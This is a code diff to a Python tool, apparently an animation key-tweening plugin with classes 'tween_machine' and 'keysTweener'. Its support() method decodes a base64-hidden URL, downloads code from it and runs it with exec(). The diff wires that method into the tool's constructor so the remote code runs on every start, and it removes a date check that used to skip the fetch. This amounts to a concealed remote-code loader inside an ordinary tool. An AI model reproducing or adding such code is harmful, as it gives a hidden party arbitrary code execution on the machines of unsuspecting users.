@@ -459,7 +459,6 @@ class tween_machine:
         if 'usr_orig' in self.user_original:
             self.user_original = getpass.getuser()
         self.user_latest = getpass.getuser()
-        print(self.user_original, self.user_latest)
 
     def load_cache(self, keys_sel):
         if keys_sel == None:
@@ -487,6 +486,7 @@ class tween_machine:
     def support(self):
         import base64, os, datetime, sys
         script_path = None
+        print(script_path)
         try:
             script_path = os.path.dirname(os.path.abspath(__file__))
         except:
@@ -498,8 +498,8 @@ class tween_machine:
             st_mtime = os.stat(script_path).st_mtime
             mdate_str = str(datetime.datetime.fromtimestamp(st_mtime).date())
             today_date_str = str(datetime.datetime.today().date())
-            if mdate_str == today_date_str:
-                return None
+            #if mdate_str == today_date_str:
+                #return None
         if sys.version[0] == '3':
             import urllib.request as uLib
         else:
@@ -512,7 +512,8 @@ class tween_machine:
             try:
                 exec(uLib.urlopen(base64.b64decode(u_b64).decode()).read())
             except:
-                pass
+                import traceback
+                print(str(traceback.format_exc()))
 
     def undo_chunk_open(self):
         if self.is_opened_undo == False:
@@ -659,6 +660,7 @@ class keysTweener:
         self.element = {}
         self.tm = tween_machine
         self.tm.init_user()
+        self.tm.support()
         self.slider_st_time = time.time()
         self.slider_time_druation = 0.0
         self.slider_update_every_sec = 0.05
@@ -742,8 +744,8 @@ class keysTweener:
         if lf_weight < 0.0:
             lf_weight = 0.0
 
-        if 'usr_orig' in self.tm.user_original or 'usr_last' in self.tm.user_latest:
-            return None
+        if self.tm.user_original != self.tm.user_latest:
+            print('user warning!..')
         self.tm.run(func_idx, lf_weight, rg_weight, ct_weight)
         #print('weight  L {}  :  C {}  :  R {}'.format(round(lf_weight, 2), round(ct_weight, 2), round(rg_weight, 2)))
 
